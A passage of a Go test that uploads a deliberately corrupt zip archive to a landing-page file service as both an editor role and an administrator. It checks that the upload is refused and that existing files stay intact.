		if _, code := landingDo(t, rig.admin, http.MethodPut, url+"files/"+path, rig.csrf, "text/plain", []byte(body)); code != http.StatusOK {
			t.Fatalf("admin writes %s: %d", path, code)
		}
	}
	rig.setRole(t, editorAccess("cid"))
	bad := corruptZip(t, "<p>[CID]</p>", "SECOND-BODY")
	read := func(path string) (string, int) {
		raw, code := landingDo(t, rig.admin, http.MethodGet, url+"files/"+path, "", "", nil)
		return string(raw), code
	}
	for name, who := range map[string]struct {
		c    *http.Client
		csrf string
	}{"role": {rig.user, rig.ucsrf}, "administrator": {rig.admin, rig.csrf}} {
		if _, code := landingDo(t, who.c, http.MethodPost, url+"archive", who.csrf, "application/zip", bad); code != http.StatusBadRequest {
			t.Errorf("%s: corrupt archive: %d", name, code)
		}
		if body, code := read("index.html"); code != http.StatusOK || !strings.Contains(body, "keep") {
			t.Errorf("%s: index.html after the refused archive: %d %q", name, code, body)
		}
		if body, code := read("old.txt"); code != http.StatusOK || !strings.Contains(body, "old") {
			t.Errorf("%s: old.txt after the refused archive: %d %q", name, code, body)
		}
	}
}
